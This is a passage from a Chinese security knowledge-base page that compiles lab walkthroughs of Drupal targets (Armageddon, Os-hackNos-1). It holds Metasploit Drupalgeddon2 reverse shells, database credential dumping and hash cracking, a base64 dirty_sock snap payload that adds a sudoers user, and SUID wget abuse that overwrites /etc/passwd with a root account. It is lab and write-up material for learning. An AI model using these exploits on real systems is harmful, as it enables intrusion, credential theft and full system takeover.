---
title: Drupal 入口与本地权限衔接
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/cms-drupal/
categories:
- Web安全
- CMS与插件
tags:
- 知识库
- Drupal
- 配置泄露
- snap
- SUID
- wget
- Dirty COW
- 内核
description: 同样的 CMS 入口可能接到完全不同的本地权限问题。本章对照 Drupal 的版本信息、配置文件、用户哈希与后续 snap、SUID 和内核路线，保留每段操作所处的身份。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

同样的 CMS 入口可能接到完全不同的本地权限问题。本章对照 Drupal 的版本信息、配置文件、用户哈希与后续 snap、SUID 和内核路线，保留每段操作所处的身份。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/cms-drupal/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Armageddon 的 snap 分支保留原脚本失败后对载荷内容的处理。

Os-hackNos-1 的 wget 权限与 Lampiao 的内核竞争条件不能互相替代。

数据库凭据、文件权限和编译环境均随各案例完整保留。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [Drupal 凭据落点与 snap 权限](#case-armageddon) | Armageddon | Drupal、配置泄露、snap |
| [Drupal 执行与 wget 文件权限](#case-hacknos-os-hacknos-1) | hackNos-Os-hackNos-1 | Drupal、SUID、wget |
| [应用入口与 Dirty COW 分支](#case-lampiao-1) | Lampiao-1 | Drupal、Dirty COW、内核 |

<a id="case-armageddon"></a>

## Drupal 凭据落点与 snap 权限

Drupalgeddon2 提供初始执行，settings.php 中的数据库配置用于定位用户哈希。后半段保留了直接运行 dirty_sock 脚本失败后的 snap 内容提取方法。

<p class="kb-provenance">来源 Armageddon · 原记录 2021-03-29 · 12 个代码块 · 4 处图片引用</p>

<details class="kb-evidence" id="record-armageddon">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start Armageddon -->

#### introduce

OS: Linux
Difficulty: Easy
Points:	20
Release:	27 Mar 2021
IP:	10.10.10.233

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1912.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### information gathering

first use nmap as usaul

``` bash
┌──(root💀kali)-[~/hackthebox/machine/Armageddon]
└─# nmap -sV -v -p- --min-rate=10000 10.10.10.233
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
```

So basically Two ports are opened 22:ssh 80:http

#### Port-80

There is a simple login page.
Let's check the source code for some juicy stuff.

``` bash
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
```

I found the drupal version "Drupal 7".
Let's search on google for exploit for this specific version.

Found a rapid7 page

 - [Drupal Drupalgeddon 2 Forms API Property Injection](https://www.rapid7.com/db/modules/exploit/unix/webapp/drupal_drupalgeddon2/)

Let's try this real quick.

``` bash
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set lhost tun0
lhost => tun0
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 10.10.10.233
rhost => 10.10.10.233
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > show options

Module options (exploit/unix/webapp/drupal_drupalgeddon2):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   DUMP_OUTPUT  false            no        Dump payload command output
   PHP_FUNC     passthru         yes       PHP function to execute
   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS       10.10.10.233     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT        80               yes       The target port (TCP)
   SSL          false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI    /                yes       Path to Drupal install
   VHOST                         no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic (PHP In-Memory)


msf6 exploit(unix/webapp/drupal_drupalgeddon2) > run

[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable.
[*] Sending stage (39282 bytes) to 10.10.10.233
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.233:59810) at 2021-03-29 07:57:22 -0400
id

meterpreter > id
[-] Unknown command: id.
meterpreter > getuid
Server username:  (48)
meterpreter > pwd
/var/www/html
meterpreter > ls
Listing: /var/www/html
======================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100644/rw-r--r--  317     fil   2017-06-21 14:20:18 -0400  .editorconfig
100644/rw-r--r--  174     fil   2017-06-21 14:20:18 -0400  .gitignore
100644/rw-r--r--  6112    fil   2017-06-21 14:20:18 -0400  .htaccess
100644/rw-r--r--  111613  fil   2017-06-21 14:20:18 -0400  CHANGELOG.txt
100644/rw-r--r--  1481    fil   2017-06-21 14:20:18 -0400  COPYRIGHT.txt
100644/rw-r--r--  1717    fil   2017-06-21 14:20:18 -0400  INSTALL.mysql.txt
100644/rw-r--r--  1874    fil   2017-06-21 14:20:18 -0400  INSTALL.pgsql.txt
100644/rw-r--r--  1298    fil   2017-06-21 14:20:18 -0400  INSTALL.sqlite.txt
100644/rw-r--r--  17995   fil   2017-06-21 14:20:18 -0400  INSTALL.txt
100644/rw-r--r--  18092   fil   2016-11-16 18:57:05 -0500  LICENSE.txt
100644/rw-r--r--  8710    fil   2017-06-21 14:20:18 -0400  MAINTAINERS.txt
100644/rw-r--r--  5382    fil   2017-06-21 14:20:18 -0400  README.txt
100644/rw-r--r--  10123   fil   2017-06-21 14:20:18 -0400  UPGRADE.txt
100644/rw-r--r--  6604    fil   2017-06-21 14:20:18 -0400  authorize.php
100644/rw-r--r--  720     fil   2017-06-21 14:20:18 -0400  cron.php
40755/rwxr-xr-x   4096    dir   2017-06-21 14:20:18 -0400  includes
100644/rw-r--r--  529     fil   2017-06-21 14:20:18 -0400  index.php
100644/rw-r--r--  703     fil   2017-06-21 14:20:18 -0400  install.php
100777/rwxrwxrwx  119357  fil   2021-03-28 22:59:36 -0400  linlog.txt
40755/rwxr-xr-x   4096    dir   2020-12-04 05:10:24 -0500  misc
40755/rwxr-xr-x   4096    dir   2017-06-21 14:20:18 -0400  modules
40755/rwxr-xr-x   70      dir   2017-06-21 14:20:18 -0400  profiles
100644/rw-r--r--  2189    fil   2017-06-21 14:20:18 -0400  robots.txt
40755/rwxr-xr-x   261     dir   2017-06-21 14:20:18 -0400  scripts
100755/rwxr-xr-x  55      fil   2021-03-28 22:43:06 -0400  shell.sh
40755/rwxr-xr-x   75      dir   2017-06-21 14:20:18 -0400  sites
40755/rwxr-xr-x   94      dir   2017-06-21 14:20:18 -0400  themes
100644/rw-r--r--  19986   fil   2017-06-21 14:20:18 -0400  update.php
100644/rw-r--r--  2200    fil   2017-06-21 14:20:18 -0400  web.config
100644/rw-r--r--  417     fil   2017-06-21 14:20:18 -0400  xmlrpc.php
```

We got the shell.

Now let's enumerate some good stuff.

I found an interesting file called settings.php inside /var/www/html/sites/default/ directory. which has contain mysql creads.

``` bash
meterpreter > ls
Listing: /var/www/html/sites/default
====================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  26250  fil   2017-06-21 14:20:18 -0400  default.settings.php
40775/rwxrwxr-x   37     dir   2020-12-03 07:32:39 -0500  files
100444/r--r--r--  26565  fil   2020-12-03 07:32:37 -0500  settings.php

meterpreter > cat settings.php
'''
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
'''
```

But before connect to the mysql let's spawn a stable shell first.

python3 tty shell doesn't spawn So let's try connect with mysql without tty shell.

``` bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
Database
information_schema
drupal
mysql
performance_schema
```

It's work let's fetch the tables inside drupal database.

``` bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'show tables;'
Tables_in_drupal
actions
authmap
batch
block
block_custom
block_node_type
block_role
blocked_ips
cache
cache_block
cache_bootstrap
cache_field
cache_filter
cache_form
cache_image
cache_menu
cache_page
cache_path
comment
date_format_locale
date_format_type
date_formats
field_config
field_config_instance
field_data_body
field_data_comment_body
field_data_field_image
field_data_field_tags
field_revision_body
field_revision_comment_body
field_revision_field_image
field_revision_field_tags
file_managed
file_usage
filter
filter_format
flood
history
image_effects
image_styles
menu_custom
menu_links
menu_router
node
node_access
node_comment_statistics
node_revision
node_type
queue
rdf_mapping
registry
registry_file
role
role_permission
search_dataset
search_index
search_node_links
search_total
semaphore
sequences
sessions
shortcut_set
shortcut_set_users
system
taxonomy_index
taxonomy_term_data
taxonomy_term_hierarchy
taxonomy_vocabulary
url_alias
users
users_roles
variable
watchdog
```

Now let's dump the username and hashes inside users table.

``` bash
mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
name    pass

brucetherealadmin       $S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
hacker  $S$DUnQhzNDVFOtAeb0JLMAtUesQM9iI1ZvcOixoulqd98XsmmEyE2b
```

Now we have the hashes let's try to crack it.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/Armageddon]
└─# john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
booboo           (?)
```

We got the password for brucetherealadmin:booboo

Let's ssh in real quick and get the user.txt.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/Armageddon]
└─# ssh brucetherealadmin@10.10.10.233
The authenticity of host '10.10.10.233 (10.10.10.233)' can't be established.
ECDSA key fingerprint is SHA256:bC1R/FE5sI72ndY92lFyZQt4g1VJoSNKOeAkuuRr4Ao.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.233' (ECDSA) to the list of known hosts.
brucetherealadmin@10.10.10.233's password: 
Last login: Fri Mar 19 08:01:19 2021 from 10.10.14.5
[brucetherealadmin@armageddon ~]$ id
uid=1000(brucetherealadmin) gid=1000(brucetherealadmin) 组=1000(brucetherealadmin) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[brucetherealadmin@armageddon ~]$ whoami
brucetherealadmin
[brucetherealadmin@armageddon ~]$ ls
user.txt
[brucetherealadmin@armageddon ~]$ cat user.txt
da64e52c766febd51f05a14be029868f
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1913.jpg)

#### Privilege escalation

Before running linpeas let's try manually first.

``` bash
[brucetherealadmin@armageddon ~]$ sudo -l
匹配 %2$s 上 %1$s 的默认条目：
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME
    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

用户 brucetherealadmin 可以在 armageddon 上运行以下命令：
    (root) NOPASSWD: /usr/bin/snap install *
```

Let's google it for Privilege escalation.

 - [Privilege Escalation in Ubuntu Linux (dirty_sock exploit)](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)
 - [dirty_sockv2.py](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py)

This github python script doesn't work in this case so in this script we only need the base64 string and then we decode the base64 string and save it in file.

``` bash
[brucetherealadmin@armageddon tmp]$ python -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A" * 4256 + "=="' | base64 -d > dedsec.snap
```

run the following commands and we got root

``` bash
[brucetherealadmin@armageddon tmp]$ ls
luci.snap
[brucetherealadmin@armageddon tmp]$ sudo /usr/bin/snap install --devmode luci.snap
dirty-sock 0.1 installed
[brucetherealadmin@armageddon tmp]$ su dirty_sock
密码：
[dirty_sock@armageddon tmp]$ sudo -i

我们信任您已经从系统管理员那里了解了日常注意事项。
总结起来无外乎这三点：

    #1) 尊重别人的隐私。
    #2) 输入前要先考虑(后果和风险)。
    #3) 权力越大，责任越大。

[sudo] dirty_sock 的密码：
[root@armageddon ~]# id
uid=0(root) gid=0(root) 组=0(root) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@armageddon ~]# whoami
root
[root@armageddon ~]# ls
anaconda-ks.cfg  cleanup.sh  passwd  reset.sh  root.txt  snap
[root@armageddon ~]# cat root.txt
2ff5df0cda6758a019dc1481ff002da1
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1914.jpg)


#### Summary of knowledge

 - using msf get a shell by Drupal Drupalgeddon 2 Forms API Property Injection
 - john crack Drupal7 hash
 - Privilege Escalation by dirty_sock exploit

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end Armageddon -->

</details>

<a id="case-hacknos-os-hacknos-1"></a>

## Drupal 执行与 wget 文件权限

Brainfuck 线索和 Drupal 版本引导初始入口，后续通过 wget 的 SUID 权限影响系统账户文件。原始输入、文件格式和验证步骤完整保留。

<p class="kb-provenance">来源 hackNos-Os-hackNos-1 · 原记录 2019-12-22 · 15 个代码块 · 7 处图片引用</p>

<details class="kb-evidence" id="record-hacknos-os-hacknos-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start hackNos-Os-hackNos-1 -->

名称：hackNos: Os-hackNos
发布日期：2019年11月27日

 - Download: https://drive.google.com/open?id=1IOpXibf-A9iSwoG4IW8HdXFvDBFoy7N1
 - Download (Mirror): https://download.vulnhub.com/hacknos/Os-hackNos-1.ova
 - Download (Torrent): https://download.vulnhub.com/hacknos/Os-hackNos-1.ova.torrent

描述：
难度：容易中级
flag：2个flag第一个user.txt和第二个root.txt
学习：利用 Web应用程序 枚举 权限提升



#### 网络配置

配置和hackNos-Os-hackNos-2-1一样，[传送门](https://fdlucifer.github.io/2019-12-19-hackNos-Os-hackNos-2-1.html)

#### 信息收集

nmap扫描一波

``` bash
root@kali:~# nmap -sn -v 192.168.56.0/24
Nmap scan report for 192.168.56.103
Host is up (0.00036s latency).
MAC Address: 08:00:27:F9:4E:C0 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -A -v -sV -Pn -T4 --script=vuln 192.168.56.103
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
```

可以看到开放了22的ssh端口和80端口

dirb扫一波

``` bash
root@kali:~# dirb http://192.168.56.103/

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Dec 22 21:06:26 2019
URL_BASE: http://192.168.56.103/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.56.103/ ----
==> DIRECTORY: http://192.168.56.103/drupal/                                                          
+ http://192.168.56.103/index.html (CODE:200|SIZE:11321)                                              
+ http://192.168.56.103/server-status (CODE:403|SIZE:279)                                             
                                                                                                      
---- Entering directory: http://192.168.56.103/drupal/ ----
==> DIRECTORY: http://192.168.56.103/drupal/includes/                                                 
+ http://192.168.56.103/drupal/index.php (CODE:200|SIZE:7687)                                         
==> DIRECTORY: http://192.168.56.103/drupal/misc/                                                     
==> DIRECTORY: http://192.168.56.103/drupal/modules/                                                  
==> DIRECTORY: http://192.168.56.103/drupal/profiles/                                                 
+ http://192.168.56.103/drupal/robots.txt (CODE:200|SIZE:2189)                                        
==> DIRECTORY: http://192.168.56.103/drupal/scripts/                                                  
==> DIRECTORY: http://192.168.56.103/drupal/sites/                                                    
==> DIRECTORY: http://192.168.56.103/drupal/themes/                                                   
+ http://192.168.56.103/drupal/web.config (CODE:200|SIZE:2200)                                        
+ http://192.168.56.103/drupal/xmlrpc.php (CODE:200|SIZE:42)
```

发现存在drupal服务

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub81.jpg)

dirbuster再爆破一波.txt后缀的文件

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub82.jpg)

``` bash
http://192.168.56.103/alexander.txt
```

base64字符串

``` bash
KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA==
```

将base64字符串解密

``` bash
root@kali:~# echo "KysrKysgKysrKysgWy0+KysgKysrKysgKysrPF0gPisrKysgKysuLS0gLS0tLS0gLS0uPCsgKytbLT4gKysrPF0gPisrKy4KLS0tLS0gLS0tLjwgKysrWy0gPisrKzwgXT4rKysgKysuPCsgKysrKysgK1stPi0gLS0tLS0gLTxdPi0gLS0tLS0gLS0uPCsKKytbLT4gKysrPF0gPisrKysgKy48KysgKysrWy0gPisrKysgKzxdPi4gKysuKysgKysrKysgKy4tLS0gLS0tLjwgKysrWy0KPisrKzwgXT4rKysgKy48KysgKysrKysgWy0+LS0gLS0tLS0gPF0+LS4gPCsrK1sgLT4tLS0gPF0+LS0gLS4rLi0gLS0tLisKKysuPA=="  | base64 -d
+++++ +++++ [->++ +++++ +++<] >++++ ++.-- ----- --.<+ ++[-> +++<] >+++.
----- ---.< +++[- >+++< ]>+++ ++.<+ +++++ +[->- ----- -<]>- ----- --.<+
++[-> +++<] >++++ +.<++ +++[- >++++ +<]>. ++.++ +++++ +.--- ---.< +++[-
>+++< ]>+++ +.<++ +++++ [->-- ----- <]>-. <+++[ ->--- <]>-- -.+.- ---.+
++.<
```

可以看出是brain-fuck加密的字符串，到[Brainfuck/Ook! Obfuscation/Encoding](https://www.splitbrain.org/services/ook)解密。

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub83.jpg)

得到账号密码：james/Hacker@4514，登录。

#### getshell得到第一个flag

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub84.jpg)

发现是 7.57 版本，存在drupalgeddon2远程代码执行

使用msf

``` bash
root@kali:~# msfdb run
[+] Starting database
                                                  
# cowsay++                                                                                                                                                                                                                                 
 ____________                                                                                                                                                                                                                              
< metasploit >                                                                                                                                                                                                                             
 ------------                                                                                                                                                                                                                              
       \   ,__,                                                                                                                                                                                                                            
        \  (oo)____                                                                                                                                                                                                                        
           (__)    )\                                                                                                                                                                                                                      
              ||--|| *                                                                                                                                                                                                                     
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
       =[ metasploit v5.0.64-dev                          ]                                                                                                                                                                                
+ -- --=[ 1952 exploits - 1089 auxiliary - 335 post       ]                                                                                                                                                                                
+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]                                                                                                                                                                                
+ -- --=[ 7 evasion                                       ]                                                                                                                                                                                
                                                                                                                                                                                                                                           
msf5 > search Drupalgeddon2                                                                                                                                                                                                                
                                                                                                                                                                                                                                           
Matching Modules                                                                                                                                                                                                                           
================                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
   #  Name                                      Disclosure Date  Rank       Check  Description                                                                                                                                             
   -  ----                                      ---------------  ----       -----  -----------                                                                                                                                             
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection                                                                                                      
                                                                                                                                                                                                                                           
                                                                                                                                                                                                                                           
msf5 > use exploit/unix/webapp/drupal_drupalgeddon2                                                                                                                                                                                        
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set rhost 192.168.56.103
rhost => 192.168.56.103
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set targeturi /drupal
targeturi => /drupal
msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 192.168.56.102:4444 
[*] Sending stage (38288 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.102:4444 -> 192.168.56.103:58828) at 2019-12-22 22:08:44 -0500

ls
pwd

meterpreter > 
meterpreter > ls
Listing: /var/www/html/drupal
=============================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  317     fil   2018-02-21 12:28:43 -0500  .editorconfig
100777/rwxrwxrwx  174     fil   2018-02-21 12:28:43 -0500  .gitignore
100777/rwxrwxrwx  6112    fil   2018-02-21 12:28:43 -0500  .htaccess
100777/rwxrwxrwx  111736  fil   2018-02-21 12:28:43 -0500  CHANGELOG.txt
100777/rwxrwxrwx  1481    fil   2018-02-21 12:28:43 -0500  COPYRIGHT.txt
100777/rwxrwxrwx  1717    fil   2018-02-21 12:28:43 -0500  INSTALL.mysql.txt
100777/rwxrwxrwx  1874    fil   2018-02-21 12:28:43 -0500  INSTALL.pgsql.txt
100777/rwxrwxrwx  1298    fil   2018-02-21 12:28:43 -0500  INSTALL.sqlite.txt
100777/rwxrwxrwx  17995   fil   2018-02-21 12:28:43 -0500  INSTALL.txt
100777/rwxrwxrwx  18092   fil   2016-11-16 18:57:05 -0500  LICENSE.txt
100777/rwxrwxrwx  8710    fil   2018-02-21 12:28:43 -0500  MAINTAINERS.txt
100777/rwxrwxrwx  5382    fil   2018-02-21 12:28:43 -0500  README.txt
100777/rwxrwxrwx  10123   fil   2018-02-21 12:28:43 -0500  UPGRADE.txt
100777/rwxrwxrwx  6604    fil   2018-02-21 12:28:43 -0500  authorize.php
100777/rwxrwxrwx  720     fil   2018-02-21 12:28:43 -0500  cron.php
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  includes
100777/rwxrwxrwx  529     fil   2018-02-21 12:28:43 -0500  index.php
100777/rwxrwxrwx  703     fil   2018-02-21 12:28:43 -0500  install.php
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  misc
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  modules
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  profiles
100777/rwxrwxrwx  2189    fil   2018-02-21 12:28:43 -0500  robots.txt
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  scripts
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  sites
40777/rwxrwxrwx   4096    dir   2018-02-21 12:28:43 -0500  themes
100777/rwxrwxrwx  19986   fil   2018-02-21 12:28:43 -0500  update.php
100777/rwxrwxrwx  2200    fil   2018-02-21 12:28:43 -0500  web.config
100777/rwxrwxrwx  417     fil   2018-02-21 12:28:43 -0500  xmlrpc.php

meterpreter > pwd
/var/www/html/drupal
meterpreter > shell
Process 2203 created.
Channel 0 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@hackNos:/var/www/html/drupal$ ls
ls
CHANGELOG.txt       INSTALL.txt      authorize.php  misc        sites
COPYRIGHT.txt       LICENSE.txt      cron.php       modules     themes
INSTALL.mysql.txt   MAINTAINERS.txt  includes       profiles    update.php
INSTALL.pgsql.txt   README.txt       index.php      robots.txt  web.config
INSTALL.sqlite.txt  UPGRADE.txt      install.php    scripts     xmlrpc.php
www-data@hackNos:/var/www/html/drupal$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@hackNos:/var/www/html/drupal$ whoami
whoami
www-data
www-data@hackNos:/var/www/html/drupal$
```

找到第一个flag

``` bash
www-data@hackNos:/var/www/html/drupal$ cd /home
cd /home
www-data@hackNos:/home$ ls
ls
james
www-data@hackNos:/home$ cd james
cd james
www-data@hackNos:/home/james$ ls
ls
user.txt
www-data@hackNos:/home/james$ cat user.txt
cat user.txt
   _                                  
  | |                                 
 / __) ______  _   _  ___   ___  _ __ 
 \__ \|______|| | | |/ __| / _ \| '__|
 (   /        | |_| |\__ \|  __/| |   
  |_|          \__,_||___/ \___||_|   
                                      
                                      

MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
www-data@hackNos:/home/james$
```

#### 提权，找到第二个flag

使用SUID检查文件查找命令，看到输出/usr/bin/wget 有SUID权限

``` bash
www-data@hackNos:/home/james$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/i386-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/pkexec
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/newuidmap
/usr/bin/wget
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/chfn
/bin/ping6
/bin/umount
/bin/ntfs-3g
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
```

进入/etc/passwd并将此文件复制到本地系统，并使用openSSL生成新密码

``` bash
root@kali:~# openssl passwd -1 -salt lucifer11 passwd                                                                                    
$1$lucifer1$TOAYpZO4bCfctvslb57pP.
```

将生成的hash值放入passwd中

``` bash
lucifer11:$1$lucifer1$TOAYpZO4bCfctvslb57pP.:0:0:,,,/root:/bin/bash
```

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub85.jpg)

``` bash
root@kali:~# python -m SimpleHTTPServer
Serving HTTP on 0.0.0.0 port 8000 ...
```

在shell中下载并替换passwd文件

``` bash
